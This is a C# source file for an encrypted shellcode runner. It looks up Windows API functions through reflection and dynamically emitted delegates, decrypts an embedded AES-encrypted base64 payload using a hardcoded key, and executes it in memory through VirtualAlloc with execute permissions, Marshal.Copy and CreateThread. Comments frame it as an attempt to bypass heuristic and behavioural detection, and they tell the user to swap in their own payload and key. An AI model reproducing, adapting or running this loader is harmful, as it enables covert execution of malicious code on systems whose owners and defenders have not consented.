
            using System;
            using System.Collections.Generic;
            using System.Linq;
            using System.Text;
            using System.Threading.Tasks;
            using System.Reflection;
            using System.Runtime.InteropServices;
            using System.Data;
            using System.Reflection.Emit;
            using System.Net.Http;
            using System.IO;
            using System.Security.Cryptography;


namespace ReflEncShellCodeRunner
    {
        internal class Program
        {
            static void Main(string[] args)
            {
                Type UNSAFEWin32Type = typeof(Int16);
                //Search For This File amd Assembly sysdll = Assembly.LoadFrom(@" C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll");
                Assembly sysdll = Assembly.LoadWithPartialName("System");
                Console.WriteLine("Search For Target Classes");
                Console.Beep();

                Type[] ts = sysdll.GetTypes();
                foreach (var type in ts)
                {
                    if (type.FullName.Equals("Microsoft.Win32.UnsafeNativeMethods"))
                    {
                        UNSAFEWin32Type = type;
                        Console.WriteLine("Found Traget Class: " + type.FullName);

                    }

                }
                MethodInfo[] methods = UNSAFEWin32Type.GetMethods();
                int i = 0;
                Console.WriteLine("Search For Target Functions");
                Console.Beep();
                MethodInfo GetModuleHAND = typeof(int).GetMethod("trash");
                MethodInfo GetProcADDR = typeof(int).GetMethod("trash");
                foreach (var m in methods)
                {
                    if (m.Name.Equals("GetModuleHandle"))
                    {
                        GetModuleHAND = m;
                        Console.WriteLine($"Found Target Function : {i} {GetModuleHAND.Name} ");

                    }

                    if (m.Name.Equals("GetProcAddress"))
                    {
                        GetProcADDR = m;
                        Console.WriteLine($"Found Target Function : {i} {GetProcADDR.Name} ");
                        break;
                    }
                    i++;
                }


                ///var MyAssembly = AppDomain.CurrentDomain.GetType().Assembly.GetName();
                ///var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(MyAssembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);




                object ExecFunctionWithReflection2(string DLLName, string FucntionName, object p1, object p2, object returnDT)
                {
                    IntPtr DynamicLookUPFunc()
                    {
                        object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                        IntPtr ADDR = (IntPtr)retptr;
                        Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                        Console.Beep();
                        Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                        return ADDR;
                    }

                    Assembly myAsm;
                    AssemblyName assembly;
                    assembly = new AssemblyName();
                    assembly.Name = "ReflectionEmitDelegateTest";
                    var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                    var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                    var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                    ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType() });
                    constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType() });
                    MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    Type tex = MyTypeBuilder.CreateType();
                    var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                    var FuncRet = func.DynamicInvoke(new object[] { p1, p2 });
                    Console.WriteLine($"Invoking  {FucntionName} With Return {FuncRet}...........");

                    return FuncRet;
                }


                object ExecFunctionWithReflection4(string DLLName, string FucntionName, object p1, object p2, object p3, object p4, object returnDT)
                {
                    IntPtr DynamicLookUPFunc()
                    {
                        object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                        IntPtr ADDR = (IntPtr)retptr;
                        Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                        Console.Beep();
                        Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                        return ADDR;
                    }

                    Assembly myAsm;
                    AssemblyName assembly;
                    assembly = new AssemblyName();
                    assembly.Name = "ReflectionEmitDelegateTest";
                    var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                    var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                    var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                    ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType() });
                    constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType() });
                    MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    Type tex = MyTypeBuilder.CreateType();
                    var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                    var FuncRet = func.DynamicInvoke(new object[] { p1, p2, p3, p4, });
                    Console.WriteLine($"Invoking  {FucntionName} With Address {FuncRet}...........");

                    return FuncRet;
                }






                object ExecFunctionWithReflection6(string DLLName, string FucntionName, object p1, object p2, object p3, object p4, object p5, object p6, object returnDT)
                {
                    IntPtr DynamicLookUPFunc()
                    {
                        object retptr = GetProcADDR.Invoke(null, new object[] { GetModuleHAND.Invoke(null, new object[] { DLLName }), FucntionName });
                        IntPtr ADDR = (IntPtr)retptr;
                        Console.WriteLine($"Hooking {FucntionName} From {DLLName}........");
                        Console.Beep();
                        Console.WriteLine($"Address of {FucntionName} is: 0x" + ADDR.ToString("X"));
                        return ADDR;
                    }

                    Assembly myAsm;
                    AssemblyName assembly;
                    assembly = new AssemblyName();
                    assembly.Name = "ReflectionEmitDelegateTest";
                    var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                    var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                    var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                    ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType(), p5.GetType(), p6.GetType() });
                    constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, returnDT.GetType(), new Type[] { p1.GetType(), p2.GetType(), p3.GetType(), p4.GetType(), p5.GetType(), p6.GetType() });
                    MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    Type tex = MyTypeBuilder.CreateType();
                    var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(), tex);
                    var FuncRet = func.DynamicInvoke(new object[] { p1, p2, p3, p4, p5, p6 });
                    Console.WriteLine($"Invoking  {FucntionName} With Address {FuncRet}...........");

                    return FuncRet;
                }

                int returnedval = 10;
                var result = ExecFunctionWithReflection4("user32.dll", "MessageBoxA", IntPtr.Zero, "Fuuuuuuuuuck Powershell", "This is My MessageBox From C#", 0, returnedval);
                Console.WriteLine(result.GetType());





                // attempt heuristics/behaviour bypass


                // decrypt the base64 payload - change these to your own encrypted payload and key

                string payload = "bxHKF9Zvogx4qX55AlFQYh+fXXWGjdTmRWOO1/yftQvHz4VfEyJycUsoQLgty3rE+oRI2W+zmBDQqJcny/BeGjSBqzsKKaca+FoJ4YvIEEiC2GFxt5dlqAQ5y/APlNwTuc8dUuDbVLomtVZ1IeenJiv0lCNz7Lks15pp+MiSxq1Wg62j+e6iZcFLF7b0LYOXGVx1/vmfy39dsooaxyCuMh9ZLx0Kvb4/SiuZeD+zH0Rg61vf9CTEWK7xheUQSRo4sFUlEvD+nc0DdTUUa9hQ1Setna02uu3SEBfh8N3zpLazw+VZdJ0Dxv6cO9myiBfoaL2J/Q7omk1cunRXQvvzGw3pQNsToQs0ZXp9lhMbE3GMMURDUjdQpeDVplq8c7a0Iw6kfYSulPa3CAiCAWTCaF7pFLk8C+mWrOoPjcdFOF91uC5TAUv8B4cWIgRaVwMTB6A0+Tw5e3jWd1Z7p7V0JANbOPNKdsLhankjVgUk7uh+vxeTT4Z2VJ4DhtUThnwMqCYETYPqvUlP1Ot2cN3RWBR86Onevu7QYPoQ3xPKFo6n+3jdeR42g44NSTBEmfEuN5jerALWU/C2s04wtZoFTM57IKcjGoKrandu3PJ1a+6NyM4QhNFKg66n0Sb0OuQDFG/C5t6oBkU2zzOdaAEsaLhGMh+NNCgghizDcieMnZwTVSaHaaybN1aR+s6At8/FVeDe0KlrsQxxW5z++AOQbzvHE0f1aPvfRPKAs9hlzAPUTwIUBHJgAyRfpo9MCM6l7z4Rvt8x92f4dOAPbzQvUx8d5VFPX8GszTdiWIli00/D82UaQlsxkWMf1vHYFXqdv/49R8N1tM9alZbIk6ky7OC8ZiK9nIw/wOx87KWNGEjmWPlZQ3pOgWAALlBk3eFiGWRoYkZY1WmiD4bw2zMOB85xtiJ+Cs4cZ14zZH/x8jRGnt6kgxblQKMk29Iu/LjLyC91kJ2MOvpvnyfuVUhIWOv1jtRIX4zT3avsfUAS6pedRd5f7j9OQiZrs3MU6zQtaSQlhUgrBkQ1vIaak5HE9UubYx4SDm16kOB/vauaMJo+DQrs5EYd8GRvcd80qWygAnGVSvKpDrbED6oF2mpNMmBMk15ZPorP13s6zcjRejxnWN6yre7L06hEb8GV9uPIHJFkmgM5wDUHkSyrUvarSsQTROee8rLLkf76M894iTV+wkVtUtbXhHKTvwq7+GO0Uueuf5ocl+d3xsSszxxp7rxgfbZ2f+HQkk+EfGzL1oVO1w/noBEyJAh18h15Tnl7my2v4VED8PnNVFncBuNDUhntHdxsNmoAt0cxVBxE/WEwUkl25YlaLDpHYfmuLxfaLJOLLzM2q0eBBAwrQ7lN0OPSSlsjsk7Z6JmjN74mH+vxYuQFAR1NklKQ4PZBvg4gP9bP3vH6HTfNogntPUYUlp/0jG7Jk+yfQydvjUxm0M7CJEHzSPg9L020oFzBRyQSbkPENFoNknRFAK808SRtTAuHX+WeIRKsIfpCo1TKnPzf3CFx8WJqekLRkMrz6JD1e75C68Smg2gKWizTUH84BztcLg9MxGGpUXpNgx8rVP8YMrBpTTAclkrm5+nmSaYf9+FtdZMbRyMYnf7Mi+G+VbeFgkFibkEdCxqAvBBhlZKdkfOZ0kwvPuk1uoDCj3lHt22zAOSPwlbuCFY5Dnbw3fY4ERcwFPZqyYX6n0hjJ3VIlp/H7/yXL735S3fZn/PcrJKiDvblMFMhKWdbHBWCyJCPe9cNUvHHDJnBZPdnMT1FBtgOsUlQzZkgs3pyildEn+v7gt0iA2fvsKj+piLwNWc8QN+VbTtQXoF5I7J84FrqgrZQ8qIjOdd5ev2TdtbaoZFjrpv06a4McvbvcT9c8OWj+2Lmuv4MmdMlo8D9E/b7YcZbTA5IilHVGesypgOOs/f48vBrMrZLVdsmN6QCXPHd0ewJYbl+0F4CG9/7+1vIXV7XOHlEaOwHV622bujZtB0vkBa8zB0ONB+lKvqUs+xOWkY8eaE445GUDZ0TsQS9+2WP3GpkjrodZSWx8W8GohTXEdthazprtFirlrsuM6EJQAEcAbtSSslLdcXsbWprqIwhEP0yAE2+s6hFShEqVpuMJKyOuDZXymMSbi0wUz6gc59ksxVHIORyff128e3NBtDorGmDEqbbcPGtORVWwa+u14r2fihx9/noKJT72jeBShcyN70wFWP9qNpep/ScVDvHkolNTgUAKhL0ehg4mUMWQlp/n8fRX/DpbZkC/mwkg68jeoaliuGfidAUOFurqBLLGceArpTRQc4PTmkl9oTd+6RzciVuSjVtNTJNwRaTWDJxWSHUFVvbQE28H9hH+NTNMsmVtTzq3X7hxfl7MBay/JFihldkSkLUzVWf6/ITIbjZGaHPh70/vVSDZ6bs6Fo5Qe/DAR90v/5KLwdQjueHIaG10OmskMsUK9BwjTiCOnYmfjcmqwGO1ObqojdNpUYfn5R7pCyMR92YpC+COT7ceEFfHk2Hlsg5VAAs63nvs079DC59JvnYe27eIqFL7O1rlO77+Hp8+6nCZU6RAeWqhSS9oGfyUeyjlSP6HrGtPKzhQzNf2VJo5nVtPja6Zl7nyrnU3LdFp4Tb39uHr7yuh/tlqcc858WG3+GiO8qfA//fNPfbTy2GlujqIYgDSXBs4OwzuYb/hKvNkkoAK4DzUDSF/oh589xc/kVd426Yew+lK8xZKENe+mYnzR8DyXdtPXXQLO2xGsRzJkW/neXBC8GZPiCHoyf49EgPHw==\r\n\r\n";
                string key0 = "AES-014-Mw4q73-0xBugatti-784WQW7";

                byte[] shellcodeBytes = Decrypt(key0, payload);





                byte[] Decrypt(string key, string aes_base64)
                {
                    byte[] tempKey = Encoding.ASCII.GetBytes(key);
                    tempKey = SHA256.Create().ComputeHash(tempKey);

                    byte[] data = Convert.FromBase64String(aes_base64);

                    // decrypt data
                    Aes aes = new AesManaged();
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

                    using (MemoryStream msDecrypt = new MemoryStream())
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                        {

                            csDecrypt.Write(data, 0, data.Length);

                            return msDecrypt.ToArray();
                        }
                    }
                }

                byte[] SubArray(byte[] a, int length)
                {

                    byte[] b = new byte[length];
                    for (int i2 = 0; i2 < length; i2++)
                    {
                        b[i2] = a[i2];
                    }
                    return b;
                }




                var ShellCodeAddr = ExecFunctionWithReflection4("kernel32.dll", "VirtualAlloc", IntPtr.Zero, (uint)shellcodeBytes.Length, 0x1000, 0x40, IntPtr.Zero);
                Console.WriteLine(ShellCodeAddr);

                Marshal.Copy(shellcodeBytes, 0, (IntPtr)ShellCodeAddr, shellcodeBytes.Length);



                var handleforshell = ExecFunctionWithReflection6("kernel32.dll", "CreateThread", IntPtr.Zero, 0, (IntPtr)ShellCodeAddr, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
                Console.WriteLine(handleforshell);

                UInt32 po = 141;
                ExecFunctionWithReflection2("kernel32.dll", "WaitForSingleObject", handleforshell, 0xFFFFFFFF, po);



                /*void reflectionfunction()
                {


                    Assembly myAsm;
                    AssemblyName assembly;
                    assembly = new AssemblyName();
                    assembly.Name = "ReflectionEmitDelegateTest";
                    var MyAssemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assembly, System.Reflection.Emit.AssemblyBuilderAccess.Run);
                    var MyModuleBuilder = MyAssemblyBuilder.DefineDynamicModule("InMemoryModule", false);
                    var MyTypeBuilder = MyModuleBuilder.DefineType("BugattiDelegate", TypeAttributes.Class | TypeAttributes.Public | TypeAttributes.Sealed | TypeAttributes.AnsiClass | TypeAttributes.AutoClass, typeof(System.MulticastDelegate));
                    ConstructorBuilder constructorBuilder = MyTypeBuilder.DefineConstructor(MethodAttributes.RTSpecialName | MethodAttributes.HideBySig | MethodAttributes.Public, CallingConventions.Standard, new Type[] { typeof(IntPtr), typeof(String), typeof(String), typeof(int) });
                    constructorBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    Int32 ex = 90;
                    var MyMethodBuilder = MyTypeBuilder.DefineMethod("Invoke", MethodAttributes.Virtual | MethodAttributes.NewSlot | MethodAttributes.HideBySig | MethodAttributes.Public, ex.GetType(), new Type[] { typeof(IntPtr), typeof(String), typeof(String), typeof(int) });
                    MyMethodBuilder.SetImplementationFlags(MethodImplAttributes.Runtime | MethodImplAttributes.Managed);
                    Type tex = MyTypeBuilder.CreateType();


                    IntPtr DynamicLookUPFunc(string FunctionName, string moduleName)
                    {
                        object ret = methods[4].Invoke(null, new object[] { UNSAFEWin32Type.GetMethod("GetModuleHandle").Invoke(null, new object[] { moduleName }), FunctionName });
                        return (IntPtr)ret;
                    }
                    string dllN;
                    string FunctionN;
                    dllN = "user32.dll";
                    FunctionN = "MessageBoxA";
                    Console.WriteLine($"Address of {FunctionN} is: 0x" + DynamicLookUPFunc(FunctionN, dllN).ToString("X"));

                    var func = Marshal.GetDelegateForFunctionPointer(DynamicLookUPFunc(FunctionN, dllN), tex);
                    func.DynamicInvoke(new object[] { IntPtr.Zero, "Fuuuuuuuuuck Powershell", "This is My MessageBox From C#", 0 });

                    //Var for Parameters DataType and Values DLL Name Function Name




                }*/


            }
        }
    }

